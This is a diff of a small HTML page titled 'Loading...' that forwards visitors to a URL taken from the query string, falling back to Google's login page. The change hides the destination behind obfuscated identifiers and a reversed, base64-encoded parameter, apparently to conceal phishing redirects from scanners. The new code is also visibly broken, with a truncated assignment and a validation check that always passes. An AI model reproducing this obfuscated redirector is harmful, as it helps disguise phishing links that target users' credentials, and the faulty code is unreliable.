@@ -1,23 +1,24 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Please wait...</title>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
   <script>
-    window.onload = () => {
-      // Get full query string without the "?" prefix
-      const query = window.location.search.substring(1);
-
-      // Since there's no param name, treat entire query as URL
-      // Also decode it in case URL is encoded
-      const url = decodeURIComponent(query);
-
-      // Basic validation: must start with http or https
-     if (url && url.trim() !== '') {
-        window.location.href = url;
-      } else {
-        window.location.href = "https://www.google.com/login";
+    window.onload = function () {
+      const _0x = s => s.split('').reverse().join('');
+      const _1x = x => {
+        try {
+          return new URL(x), true;
+        } catch {
+          return false;
+        }
+      };
+      const _2x = window ;
+      try {
+        const _3x = atob(_0x(decodeURIComponent(_2x)));
+        window['location']['href'] = _1x(_3x) ? _3x : 'https://www.google.com/login';
+      } catch (e) {
+        window['location']['href'] = 'https://www.google.com/login';
       }
     };
   </script>
